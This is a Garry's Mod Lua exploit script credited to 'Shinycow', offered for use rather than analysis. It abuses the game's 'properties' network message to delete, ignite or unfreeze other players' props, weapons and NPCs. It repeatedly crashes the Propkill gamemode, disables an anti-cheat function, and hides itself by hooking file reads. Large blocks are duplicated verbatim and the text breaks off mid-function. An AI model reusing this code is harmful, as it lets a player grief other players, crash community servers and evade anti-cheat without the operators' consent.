for k,v in pairs(ents.GetAll()) do
   
    swag = v
    
end
hook.Add("CreateMove",function(cmd, u)
    if (LocalPlayer():KeyDown(IN_ATTACK)) then return end
    local aa = cmd:GetViewAngles()
    cmd:SetViewAngles(Angle(-181, aa.y, 180))
    end)


local sweg = LocalPlayer():GetEyeTrace().Entity
local ply = LocalPlayer()
local me = LocalPlayer()




concommand.Add("givemenu", function()
    GiveMenu()
    end)
concommand.Add("giveweapon", function(ply,cmd,args)
    if args[1] == nil then return end
    net.Start("giveweapon")
    net.WriteString(args[1])
    net.SendToServer()
    end)





        -- Start off by making the table.
        local SCE = {}
        local SCE_HasToggled = {}
        
        local net = net
        local concommand = concommand
        local file = file
        
        
        local oldfileRead = file.Read
        function file.Read(contents, type)
            if not contents then return nil end
            if string.lower(contents):find("scnew") or string.lower(contents):find("scexploit") then return nil end
            
            return oldfileRead(contents, type)
        end
        
        local oldICC = InjectConsoleCommand
        function InjectConsoleCommand( player, command, arguments, args )
            if SCE[ command:lower() ] then
                SCE[ command:lower() ].Function( player, command, arguments, args )
                return true
            end
            
            oldICC( player, command, arguments, args )
        end
        
        
        -- End.
        
        -- Utility functions
        local function sce_AddCommand( cmd, func, help )
            SCE[ "sc_" .. cmd:lower() ] = {Function = func, Help = help}
            AddConsoleCommand( "sc_" .. cmd:lower(), help )
        end
        
        local function FindPlayer( pl )
            for i=1,#player.GetAll() do
                local v = player.GetAll()[ i ]
                
                if string.find(string.lower(v:Nick()), string.lower(tostring(pl))) then
                    return v
                    elseif v:UserID() == tonumber(pl) then
                        return v
                    end
                end
                
                return nil
            end
               ---------------------- Very old. Still in use by some people so I'd figure I'd go ahead and give this version out.
---------------------- Old version: http://pastebin.com/sHmyx1ti





/*
        Created by Shinycow.
        http://pastebin.com/u/Derek_SM
        SteamID: STEAM_0:1:219919521
       
        Place this file somewhere obscure like lua/shinycow/scnew.lua
       
        TODO: Menu
        */
        
        -- Start off by making the table.
        local SCE = {}
        local SCE_HasToggled = {}
        
        local net = net
        local concommand = concommand
        local file = file
        
        
        local oldfileRead = file.Read
        function file.Read(contents, type)
            if not contents then return nil end
            if string.lower(contents):find("scnew") or string.lower(contents):find("scexploit") then return nil end
            
            return oldfileRead(contents, type)
        end
        
        local oldICC = InjectConsoleCommand
        function InjectConsoleCommand( player, command, arguments, args )
            if SCE[ command:lower() ] then
                SCE[ command:lower() ].Function( player, command, arguments, args )
                return true
            end
            
            oldICC( player, command, arguments, args )
        end
        
        
        -- End.
        
        -- Utility functions
        local function sce_AddCommand( cmd, func, help )
            SCE[ "sc_" .. cmd:lower() ] = {Function = func, Help = help}
            AddConsoleCommand( "sc_" .. cmd:lower(), help )
        end
        
        local function FindPlayer( pl )
            for i=1,#player.GetAll() do
                local v = player.GetAll()[ i ]
                
                if string.find(string.lower(v:Nick()), string.lower(tostring(pl))) then
                    return v
                    elseif v:UserID() == tonumber(pl) then
                        return v
                    end
                end
                
                return nil
            end
            
            
/*local function exploitRemove( tbl_ToRemove )
        --local findalldem = {}
        --for k,v in pairs(tbl_ToRemove) do
               
        --      findalldem[ k ] = {
        PrintTable(tbl_ToRemove)
        for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
               
                local shouldremove = false
               
                --for k,v in pairs(tbl_ToRemove) do if string.lower(tostring(v)):find( k:lower() ) then shouldremove = true end end
                --for k,v in pairs(tbl_ToRemove) do
                        if string.find( string.lower(tostring(v)), "weapon" ) then
                                print("Yes")
                        end
                --end
               
                if shouldremove then
                        net.Start("properties")
                                net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                                net.WriteEntity( v )
                        net.SendToServer()
                end
        end
        end*/
        
        local function exploitRemove( str_entity, b_IsEntity )
            if b_IsEntity then
                net.Start("properties")
                net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                net.WriteEntity( str_entity )
                net.SendToServer()
                
                return
            end
            for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
                
                if string.find( string.lower(tostring(v)), str_entity ) then
                    if not v.ImOwner then
                        net.Start("properties")
                        net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                        net.WriteEntity( v )
                        net.SendToServer()
                    end
                end
            end
        end
        
        local function exploitCollisions( toCollision, str_On, b_IsEntity, lookfor )
            if b_IsEntity then
                net.Start("properties")
                net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
                net.WriteEntity( toCollision )
                net.SendToServer()
                
                return
            end
            
            for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
                
                if lookfor then
                    if string.find( string.lower(tostring(v)), lookfor ) then
                        net.Start("properties")
                        net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
                        net.WriteEntity( v )
                        net.SendToServer()
                    end
                /*else
                        if string.find( string.lower(tostring(v)), toCollision ) then
                                net.Start("properties")
                                        net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
                                        net.WriteEntity( v )
                                net.SendToServer()
                                end*/
                            end
                        end
                    end
        -- End
        
        -- Commands.
        local function sce_GetList()
            PrintTable(ents.GetAll())
        end
        sce_AddCommand("exploit_debug_GetEntities", sce_GetList, "Shinycow's Exploit: Prints the list of entities.")
        
        local function sce_GetSCE()
            PrintTable(SCE)
        end
        sce_AddCommand("exploit_debug_GetSCE", sce_GetSCE, "Shinycow's Exploit: Prints the table of SCE.")
        
        local function sce_Ignite()
            for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
                
                if v.Ignited then
                    net.Start("properties")
                    net.WriteUInt( util.NetworkStringToID( "extinguish" ), 32 )
                    net.WriteEntity( v )
                    net.SendToServer()
                    
                    v.Ignited = false
                else
                    net.Start("properties")
                    net.WriteUInt( util.NetworkStringToID( "ignite" ), 32 )
                    net.WriteEntity( v )
                    net.SendToServer()
                    
                    v.Ignited = true
                end
            end
        end
        sce_AddCommand("exploit_ignite", sce_Ignite, "Shinycow's Exploit: Ignites / Extinguishes everything.")
        
        local function sce_RemoveNames()
            exploitRemove( "playerresource" )
        end
        sce_AddCommand("exploit_remove_Names", sce_RemoveNames, "Shinycow's Exploit: Removes everyone's names clientside.")
        
        local function sce_RemoveAll()
        -- No longer includes removing player names. You should call that directly.
        exploitRemove( "prop_" )
        exploitRemove( "weapon" )
        exploitRemove( "gmod" )
        exploitRemove( "func_" )
        exploitRemove( "npc" )
        exploitRemove( "env_" )
        exploitRemove( "sun" )
        exploitRemove( "base" )
        exploitRemove( "shadow" )
        exploitRemove( "beam" )
        exploitRemove( "water" )
        exploitRemove( "spotlight" )
        exploitRemove( "viewmodel" )
        exploitRemove( "userdata" )
    end
    sce_AddCommand("exploit_remove_All", sce_RemoveAll, "Shinycow's Exploit: Removes a lot of shit.")
    
    local function sce_RemoveSpecified( p, c, args )
        -- This removes whatever it can find that you specify. VERY useful.
        for i=1,#args do
            local v = args[ i ]
            
            exploitRemove( v )
        end
    end
    sce_AddCommand("exploit_remove_Specified", sce_RemoveSpecified, "Shinycow's Exploit: Removes whatever it can find that you want.")
    
    
/*local function sce_RemoveWeapons( p, c, args )
        local args1 = args[1]
 
        local checkspam = "sce_exploit_remove_spam_weapons"
        if c == checkspam then
                if not SCE_HasToggled[ checkspam ] then
                        if FindPlayer(args1) then
                                timer.Create(checkspam, 0.2, 0, function()
                                        RunConsoleCommand("sce_exploit_remove_Weapons", )
                                end)
                        else
                                timer.Create(checkspam, 0.2, 0, function()
                                        RunConsoleCommand("sce_exploit_remove_Weapons")
                                end)
                        end
                        SCE_HasToggled[ checkspam ] = true
                else
                        timer.Destroy(checkspam)
                        SCE_HasToggled[ checkspam ] = false
                end
                LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        end
       
        if args1 then
               
        --exploitRemove( "weapon" )
        --exploitRemove( "gmod" )
end
sce_AddCommand("exploit_remove_Weapons", sce_RemoveWeapons, "Shinycow's Exploit: Remove everyone's weapons.")
sce_AddCommand("exploit_remove_spam_Weapons", sce_RemoveWeapons, "Shinycow's Exploit: Spam remove everyone's weapons.")*/


local function sce_RemoveWeapons( p, c, args )
 
        -- Specifying a player.
        local args1 = args[1]
        if args1 then
         
            local target = FindPlayer(args1)
            if not target then chat.AddText(Color(75,155,155,255), "Could not find ", color_white, args1) return end
            
            for k,v in pairs(ents.FindInSphere(target:GetPos(), 20)) do
                if string.find(string.lower(tostring(v)), "weapon") then
                    exploitRemove( v, true )
                end
            end
            
        else
         
            exploitRemove( "weapon" )
            
        end
        
    end
    
    sce_AddCommand("exploit_remove_weapons", sce_RemoveWeapons, "Shinycow's Exploit: Removes (sombodies) weapons.")
    
    local function sce_RemoveTrace( p, c )
        local checkspam = "sc_exploit_remove_spam_lookingat"
        if c == checkspam then
            if not SCE_HasToggled[ checkspam ] then
                timer.Create(checkspam, 0.2, 0, function()
                    RunConsoleCommand("sc_exploit_remove_LookingAt")
                    end)
                
                SCE_HasToggled[ checkspam ] = true
            else
                timer.Destroy(checkspam)
                SCE_HasToggled[ checkspam ] = false
            end
            LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        else
            exploitRemove( LocalPlayer():GetEyeTrace().Entity, true )
        end
    end
    sce_AddCommand("exploit_remove_LookingAt", sce_RemoveTrace, "Shinycow's Exploit: Remove whatever you're looking at.")
    sce_AddCommand("exploit_remove_spam_LookingAt", sce_RemoveTrace, "Shinycow's Exploit: Spam remove whatever you're looking at.")
    
    local function sce_RemoveNPC( p, c )
        local checkspam = "sc_exploit_remove_spam_NPCs"
        if c == checkspam then
            if not SCE_HasToggled[ checkspam ] then
                timer.Create(checkspam, 0.2, 0, function()
                    RunConsoleCommand("sc_exploit_remove_NPCs")
                    end)
                
                SCE_HasToggled[ checkspam ] = true
            else
                timer.Destroy(checkspam)
                SCE_HasToggled[ checkspam ] = false
            end
            LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        else
            exploitRemove( "npc" )
            exploitRemove( "gmod" )
        end
    end
    sce_AddCommand("exploit_remove_NPCs", sce_RemoveNPC, "Shinycow's Exploit: Remove every NPC.")
    sce_AddCommand("exploit_remove_spam_NPCs", sce_RemoveNPC, "Shinycow's Exploit: Spam remove every NPC.")
    
    local function sce_RemoveRadius( p, c, args )
        local radius = args[1] or 1000
        local noweapons = tobool(args[2]) or false
        
        local checkspam = "sc_exploit_remove_spam_inradius"
        if c == checkspam then
            if not SCE_HasToggled[ checkspam ] then
                local waitamount = tonumber(args[3]) or 0.2
                timer.Create(checkspam, waitamount, 0, function()
                    RunConsoleCommand("sc_exploit_remove_InRadius", tostring(radius), tostring(noweapons))
                    end)
                
                SCE_HasToggled[ checkspam ] = true
            else
                timer.Destroy(checkspam)
                SCE_HasToggled[ checkspam ] = false
            end
            LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        else
           
            for k,v in pairs(ents.FindInSphere( LocalPlayer():GetPos(), tonumber(radius) )) do
                if noweapons then
                    if not string.find(string.lower(tostring(v)), "weapon") then
                        exploitRemove( v, true )
                    end
                else
                    exploitRemove( v, true )
                end
            end
            
        end
    end
    sce_AddCommand("exploit_remove_InRadius", sce_RemoveRadius, "Shinycow's Exploit: Remove every entity in your radius.")
    sce_AddCommand("exploit_remove_spam_InRadius", sce_RemoveRadius, "Shinycow's Exploit: Spam remove every entity in your radius. <radius> [weapons]")
    
    
    local function sce_NocollideRadius( p, c, args )
        local radius = args[1] or 1000
        local checkspam = "sc_exploit_collide_off_spam_inradius"
        
        if not SCE_HasToggled[ checkspam ] then
            timer.Create( checkspam, 0.01, 0, function()
                print("ahh")
                for k,v in pairs(ents.FindInSphere( LocalPlayer():GetPos(), tonumber(radius) )) do
                    exploitCollisions( v, "off", true )
                end
                end )
            
            SCE_HasToggled[ checkspam ] = true
        else
            timer.Destroy( checkspam )
            SCE_HasToggled[ checkspam ] = false
        end
        LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
    end
    sce_AddCommand("exploit_collide_Off_spam_InRadius", sce_NocollideRadius, "Shinycow's Exploit: Nocollide every entity in your radius.")
    
        -- TAKEN DIRECTLY FROM OLD CODE. SOWWY ABOUT THAT.
        local spamremovelp = false
        local function sce_SpamRemoveIgnore()
            if spamremovelp then
                hook.Remove("OnEntityCreated", "lolaidslp")
                timer.Destroy("lolSpamRemove")
                spamremovelp = false
            else
                hook.Add("OnEntityCreated", "lolaidslp", function( ent )
                    if LocalPlayer():GetEyeTrace().Entity == ent then ent.ImOwner = true end
                    end)
                
                timer.Create("lolSpamRemove", 0.13, 0, function()
                    RunConsoleCommand("sc_exploit_remove_Specified", "prop_physics")
                    RunConsoleCommand("sc_exploit_remove_Specified", "gmod_lamp")
                    RunConsoleCommand("sc_exploit_remove_Specified", "gmod_emitter")
                    RunConsoleCommand("sc_exploit_remove_Specified", "npc_")
                    end)
                
                spamremovelp = true
            end
        end
        sce_AddCommand("exploit_remove_spam_IgnoreMe", sce_SpamRemoveIgnore, "Shinycow's Exploit: Spam remove every entity except yours.")
        
        -- TODO
        local function sce_NoCollide( p, c, args )
            if args[1] then
                if string.find(string.lower(args[1]), "props") or string.find(string.lower(args[1]), "prop_physics") then
                    exploitCollisions( nil, "off", false, "prop_physics" )
                    
                    return
                end
            end
            
            if IsValid(LocalPlayer():GetEyeTrace().Entity) then
                exploitCollisions( LocalPlayer():GetEyeTrace().Entity, "off", true )
            end
        end
        sce_AddCommand("exploit_collide_Off", sce_NoCollide, "Shinycow's Exploit: Nocollide what you want bby.")
        
        local function sce_Collide( p, c)
            for k,v in pairs(ents.GetAll()) do
                exploitCollisions( v, "on", true )
            end
        end
        sce_AddCommand("exploit_collide_On", sce_Collide, "Shinycow's Exploit: Collide everything.")
        
        local function sce_misc_TAC()
            if RunCheck then
                function RunCheck()
                    print("nty TAC.")
                end
                LocalPlayer():ChatPrint("The shitty 'Tyler's Anti Cheat', has been patched.")
            else
                LocalPlayer():ChatPrint("Could not find Tyler's Anti Cheat.")
            end
        end
        sce_AddCommand("exploit_misc_TAC", sce_misc_TAC, "Shinycow's Exploit: Removes Tyler's Anti Cheat function.")
        
        -- DOESNT BELONG HERE:
        
/*local ps_text =
{
"Shinycow was here.",
"TEAM 1338",
"Shinycow was here.",
"Shinycow is above all.",
"Shinycow is above all.",
"Shinycow likes weiners.",
"420swagYOLO1337ERRYDAY",
"TEAM 1338",
"Shinycow was here.",
"420haxsmokeweedLOLXD"
}
local sce_spam_PS = false
local function sce_misc_PS()
        if not PS then LocalPlayer():ChatPrint("PointShop is not running!") return end
 
        if sce_spam_PS then
                timer.Destroy("lmaoPS")
                sce_spam_PS = false
        else
                timer.Create("lmaoPS", 0.5, 0, function()
                        net.Start('PS_ModifyItem')
                                net.WriteString("texthat")
                                net.WriteTable(
                                {
                                text = ps_text[math.random(#ps_text)],
                                color = { r = math.random(90,200), b = math.random(50,255), a = 255, g = math.random(50, 255) }
                                }
                                )
                        net.SendToServer()
                end)
               
                sce_spam_PS = true
        end
end
sce_AddCommand("misc_PS", sce_misc_PS, "Shinycow's Exploit: Quickly change pointshop text hat text.")*/

local sce_toggle_Crash = false
local function sce_misc_CrashPropkill()
        --if gmod.GetGamemode().Name != "Propkill v2.6" then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        if not PK and not PK.HudSettings then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        
        if sce_toggle_Crash then
            hook.Remove("CreateMove", "lmaoPK")
            sce_toggle_Crash = false
        else
            hook.Add("CreateMove", "lmaoPK", function()
                RunConsoleCommand("ulx","addcustomspawn","battler")
                end)
            sce_toggle_Crash = true
        end
    end
    sce_AddCommand("exploit_misc_PK", sce_misc_CrashPropkill, "Shinycow's Exploit: Toggle crashing Propkill v2.6.")
    
    
    local function sce_misc_CrashPropkillSlower()
        --if gmod.GetGamemode().Name != "Propkill v2.6" and gmod.GetGamemode().Name != "Propkill v1337" then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        if not PK and not PK.HudSettings then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        
        timer.Create("lmaoPK", 1.4, 0, function()
            RunConsoleCommand("ulx","addcustomspawn","battler")
            end)
    end
    sce_AddCommand("exploit_misc_PK2", sce_misc_CrashPropkillSlower, "ohai")
    
    
        -- Disables the stunstick flash from getting beaten in DarkRP.
        hook.Add("Initialize", "scexploit_misc_DarkRPStunstick", function()
            usermessage.Hook("StunStickFlash", function() end)
            usermessage.Hook("ulx_blind", function() end)
            end)
        
        
------------------------------------- MENU ----------------------------------------

                -- Shittily made menu.
                local function SCE_ShowConfigMenu()
                    local exploitmenu = vgui.Create("DFrame")
                    exploitmenu:SetPos( (ScrW() * 0.5) - 100, (ScrH() * 0.5) - 225 )
                    exploitmenu:SetSize( (ScrW() * 0.5) - 250, (ScrH() * 0.5) - 90 )
                    exploitmenu:SetTitle( "Exploit menu" )
                    exploitmenu:SetVisible( true )
                    exploitmenu:SetDraggable( false )
                    exploitmenu:ShowCloseButton( true )
                    exploitmenu:SetAlpha( 150 )
                    exploitmenu:AlphaTo( 255, 6, 1 )
                    exploitmenu:MakePopup()
                    
                                        -- Design coloring taken from DeathZone :3
                                        function exploitmenu:Paint()
                                            surface.SetDrawColor(Color(64, 64, 64, 255))
                                            surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
                                            surface.SetDrawColor(Color(51, 51, 51, 255))
                                            surface.DrawRect(0, 0, self:GetWide(), 22)
                                        end
                                        
                                        local exploitmenutabs = vgui.Create("DPropertySheet", exploitmenu)
                                        exploitmenutabs:SetPos( 5, 27 )
                                        exploitmenutabs:SetSize( (ScrW() * 0.5) - 260, (ScrH() * 0.5) - 120 )
                                        
                                        local ButtonPanel = vgui.Create("DPanelList", configmenu)
                        --ButtonPanel:SetPos( 25, 25 )
                        ButtonPanel:SetSize( 395, 320 )
                        ButtonPanel:SetSpacing(2)
                        ButtonPanel:EnableHorizontal(false)
                        ButtonPanel:EnableVerticalScrollbar( true )
                        
                        
                        local button1 = vgui.Create("DButton")
                        button1:SetText("Remove names")
                        button1.DoClick = function()
                        RunConsoleCommand("say", "no removing names")
                    end
                    ButtonPanel:AddItem(button1)
                    
                    local button2 = vgui.Create("DButton")
                    button2:SetText("Remove everything")
                    button2.DoClick = function()
                    RunConsoleCommand("say", "no removing everything")
                end
                ButtonPanel:AddItem(button2)
                
                local button3 = vgui.Create("DButton")
                button3:SetText("Remove what you're looking at.")
                button3.DoClick = function()
                RunConsoleCommand("say", "no removing what ur looking at")
            end
            ButtonPanel:AddItem(button3)
            
            
            exploitmenutabs:AddSheet( "Buttons", ButtonPanel, "icon16/bomb.png", false, false )
            
                        --[[local checkbox2 = vgui.Create("DCheckBoxLabel")
                        checkbox2:SetValue(0)
                        checkbox2:SetText("Remove everything")
                        function checkbox2.Button:Toggle()
                                if self:GetChecked() == nil or not self:GetChecked() then
                                        self:SetValue( true )
                                else
                                        self:SetValue( false )
                                end
                        end
                        ConfigPanel:AddItem(checkbox2)]]              
                        
                    end
                    
                    hook.Add("PlayerBindPress", "sce_ConfigMenu", function( pl, bind, b_Pressed )
                        if string.lower(bind) == "impulse 201" then
                            SCE_ShowConfigMenu()
                        end
                        end)
                    
                    
                    
                    
                    
                    
-- 2/15/14 -- lets try something new

sce_AddCommand("exploit_remove_weapons_player", function( pl, cmd, arg )
    if not arg[1] then pl:ChatPrint("supply a player name") return end
    
    local target = FindPlayer(arg[1])
    if not target then print("fuk") return end
    
    for k,v in next, ents.GetAll() do
        if string.find(string.lower(tostring(v)), "weapon") then
            if v:GetPos():Distance( target:GetPos() ) < 55 then
                net.Start("properties")
                net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                net.WriteEntity( v )
                net.SendToServer()
            end
        end
    end
    end)

/*local function exploitRemove( tbl_ToRemove )
        --local findalldem = {}
        --for k,v in pairs(tbl_ToRemove) do
               
        --      findalldem[ k ] = {
        PrintTable(tbl_ToRemove)
        for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
               
                local shouldremove = false
               
                --for k,v in pairs(tbl_ToRemove) do if string.lower(tostring(v)):find( k:lower() ) then shouldremove = true end end
                --for k,v in pairs(tbl_ToRemove) do
                        if string.find( string.lower(tostring(v)), "weapon" ) then
                                print("Yes")
                        end
                --end
               
                if shouldremove then
                        net.Start("properties")
                                net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                                net.WriteEntity( v )
                        net.SendToServer()
                end
        end
        end*/
        
        local function exploitRemove( str_entity, b_IsEntity )
            if b_IsEntity then
                net.Start("properties")
                net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                net.WriteEntity( str_entity )
                net.SendToServer()
                
                return
            end
            for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
                
                if string.find( string.lower(tostring(v)), str_entity ) then
                    if not v.ImOwner then
                        net.Start("properties")
                        net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                        net.WriteEntity( v )
                        net.SendToServer()
                    end
                end
            end
        end
        
        local function exploitCollisions( toCollision, str_On, b_IsEntity, lookfor )
            if b_IsEntity then
                net.Start("properties")
                net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
                net.WriteEntity( toCollision )
                net.SendToServer()
                
                return
            end
            
            for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
                
                if lookfor then
                    if string.find( string.lower(tostring(v)), lookfor ) then
                        net.Start("properties")
                        net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
                        net.WriteEntity( v )
                        net.SendToServer()
                    end
                /*else
                        if string.find( string.lower(tostring(v)), toCollision ) then
                                net.Start("properties")
                                        net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
                                        net.WriteEntity( v )
                                net.SendToServer()
                                end*/
                            end
                        end
                    end
        -- End
        
        -- Commands.
        local function sce_GetList()
            PrintTable(ents.GetAll())
        end
        sce_AddCommand("exploit_debug_GetEntities", sce_GetList, "Shinycow's Exploit: Prints the list of entities.")
        
        local function sce_GetSCE()
            PrintTable(SCE)
        end
        sce_AddCommand("exploit_debug_GetSCE", sce_GetSCE, "Shinycow's Exploit: Prints the table of SCE.")
        
        local function sce_Ignite()
            for i=1,#ents.GetAll() do
                local v = ents.GetAll()[ i ]
                
                if v.Ignited then
                    net.Start("properties")
                    net.WriteUInt( util.NetworkStringToID( "extinguish" ), 32 )
                    net.WriteEntity( v )
                    net.SendToServer()
                    
                    v.Ignited = false
                else
                    net.Start("properties")
                    net.WriteUInt( util.NetworkStringToID( "ignite" ), 32 )
                    net.WriteEntity( v )
                    net.SendToServer()
                    
                    v.Ignited = true
                end
            end
        end
        sce_AddCommand("exploit_ignite", sce_Ignite, "Shinycow's Exploit: Ignites / Extinguishes everything.")
        
        local function sce_RemoveNames()
            exploitRemove( "playerresource" )
        end
        sce_AddCommand("exploit_remove_Names", sce_RemoveNames, "Shinycow's Exploit: Removes everyone's names clientside.")
        
        local function sce_RemoveAll()
        -- No longer includes removing player names. You should call that directly.
        exploitRemove( "prop_" )
        exploitRemove( "weapon" )
        exploitRemove( "gmod" )
        exploitRemove( "func_" )
        exploitRemove( "npc" )
        exploitRemove( "env_" )
        exploitRemove( "sun" )
        exploitRemove( "base" )
        exploitRemove( "shadow" )
        exploitRemove( "beam" )
        exploitRemove( "water" )
        exploitRemove( "spotlight" )
        exploitRemove( "viewmodel" )
        exploitRemove( "userdata" )
    end
    sce_AddCommand("exploit_remove_All", sce_RemoveAll, "Shinycow's Exploit: Removes a lot of shit.")
    
    local function sce_RemoveSpecified( p, c, args )
        -- This removes whatever it can find that you specify. VERY useful.
        for i=1,#args do
            local v = args[ i ]
            
            exploitRemove( v )
        end
    end
    sce_AddCommand("exploit_remove_Specified", sce_RemoveSpecified, "Shinycow's Exploit: Removes whatever it can find that you want.")
    
    
/*local function sce_RemoveWeapons( p, c, args )
        local args1 = args[1]
 
        local checkspam = "sce_exploit_remove_spam_weapons"
        if c == checkspam then
                if not SCE_HasToggled[ checkspam ] then
                        if FindPlayer(args1) then
                                timer.Create(checkspam, 0.2, 0, function()
                                        RunConsoleCommand("sce_exploit_remove_Weapons", )
                                end)
                        else
                                timer.Create(checkspam, 0.2, 0, function()
                                        RunConsoleCommand("sce_exploit_remove_Weapons")
                                end)
                        end
                        SCE_HasToggled[ checkspam ] = true
                else
                        timer.Destroy(checkspam)
                        SCE_HasToggled[ checkspam ] = false
                end
                LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        end
       
        if args1 then
               
        --exploitRemove( "weapon" )
        --exploitRemove( "gmod" )
end
sce_AddCommand("exploit_remove_Weapons", sce_RemoveWeapons, "Shinycow's Exploit: Remove everyone's weapons.")
sce_AddCommand("exploit_remove_spam_Weapons", sce_RemoveWeapons, "Shinycow's Exploit: Spam remove everyone's weapons.")*/


local function sce_RemoveWeapons( p, c, args )
 
        -- Specifying a player.
        local args1 = args[1]
        if args1 then
         
            local target = FindPlayer(args1)
            if not target then chat.AddText(Color(75,155,155,255), "Could not find ", color_white, args1) return end
            
            for k,v in pairs(ents.FindInSphere(target:GetPos(), 20)) do
                if string.find(string.lower(tostring(v)), "weapon") then
                    exploitRemove( v, true )
                end
            end
            
        else
         
            exploitRemove( "weapon" )
            
        end
        
    end
    sce_AddCommand("exploit_remove_weapons", sce_RemoveWeapons, "Shinycow's Exploit: Removes (sombodies) weapons.")
    
    local function sce_RemoveTrace( p, c )
        local checkspam = "sc_exploit_remove_spam_lookingat"
        if c == checkspam then
            if not SCE_HasToggled[ checkspam ] then
                timer.Create(checkspam, 0.2, 0, function()
                    RunConsoleCommand("sc_exploit_remove_LookingAt")
                    end)
                
                SCE_HasToggled[ checkspam ] = true
            else
                timer.Destroy(checkspam)
                SCE_HasToggled[ checkspam ] = false
            end
            LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        else
            exploitRemove( LocalPlayer():GetEyeTrace().Entity, true )
        end
    end
    sce_AddCommand("exploit_remove_LookingAt", sce_RemoveTrace, "Shinycow's Exploit: Remove whatever you're looking at.")
    sce_AddCommand("exploit_remove_spam_LookingAt", sce_RemoveTrace, "Shinycow's Exploit: Spam remove whatever you're looking at.")
    
    local function sce_RemoveNPC( p, c )
        local checkspam = "sc_exploit_remove_spam_NPCs"
        if c == checkspam then
            if not SCE_HasToggled[ checkspam ] then
                timer.Create(checkspam, 0.2, 0, function()
                    RunConsoleCommand("sc_exploit_remove_NPCs")
                    end)
                
                SCE_HasToggled[ checkspam ] = true
            else
                timer.Destroy(checkspam)
                SCE_HasToggled[ checkspam ] = false
            end
            LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        else
            exploitRemove( "npc" )
            exploitRemove( "gmod" )
        end
    end
    sce_AddCommand("exploit_remove_NPCs", sce_RemoveNPC, "Shinycow's Exploit: Remove every NPC.")
    sce_AddCommand("exploit_remove_spam_NPCs", sce_RemoveNPC, "Shinycow's Exploit: Spam remove every NPC.")
    
    local function sce_RemoveRadius( p, c, args )
        local radius = args[1] or 1000
        local noweapons = tobool(args[2]) or false
        
        local checkspam = "sc_exploit_remove_spam_inradius"
        if c == checkspam then
            if not SCE_HasToggled[ checkspam ] then
                local waitamount = tonumber(args[3]) or 0.2
                timer.Create(checkspam, waitamount, 0, function()
                    RunConsoleCommand("sc_exploit_remove_InRadius", tostring(radius), tostring(noweapons))
                    end)
                
                SCE_HasToggled[ checkspam ] = true
            else
                timer.Destroy(checkspam)
                SCE_HasToggled[ checkspam ] = false
            end
            LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
        else
           
            for k,v in pairs(ents.FindInSphere( LocalPlayer():GetPos(), tonumber(radius) )) do
                if noweapons then
                    if not string.find(string.lower(tostring(v)), "weapon") then
                        exploitRemove( v, true )
                    end
                else
                    exploitRemove( v, true )
                end
            end
            
        end
    end
    sce_AddCommand("exploit_remove_InRadius", sce_RemoveRadius, "Shinycow's Exploit: Remove every entity in your radius.")
    sce_AddCommand("exploit_remove_spam_InRadius", sce_RemoveRadius, "Shinycow's Exploit: Spam remove every entity in your radius. <radius> [weapons]")
    
    
    local function sce_NocollideRadius( p, c, args )
        local radius = args[1] or 1000
        local checkspam = "sc_exploit_collide_off_spam_inradius"
        
        if not SCE_HasToggled[ checkspam ] then
            timer.Create( checkspam, 0.01, 0, function()
                print("ahh")
                for k,v in pairs(ents.FindInSphere( LocalPlayer():GetPos(), tonumber(radius) )) do
                    exploitCollisions( v, "off", true )
                end
                end )
            
            SCE_HasToggled[ checkspam ] = true
        else
            timer.Destroy( checkspam )
            SCE_HasToggled[ checkspam ] = false
        end
        LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
    end
    sce_AddCommand("exploit_collide_Off_spam_InRadius", sce_NocollideRadius, "Shinycow's Exploit: Nocollide every entity in your radius.")
    
        -- TAKEN DIRECTLY FROM OLD CODE. SOWWY ABOUT THAT.
        local spamremovelp = false
        local function sce_SpamRemoveIgnore()
            if spamremovelp then
                hook.Remove("OnEntityCreated", "lolaidslp")
                timer.Destroy("lolSpamRemove")
                spamremovelp = false
            else
                hook.Add("OnEntityCreated", "lolaidslp", function( ent )
                    if LocalPlayer():GetEyeTrace().Entity == ent then ent.ImOwner = true end
                    end)
                
                timer.Create("lolSpamRemove", 0.13, 0, function()
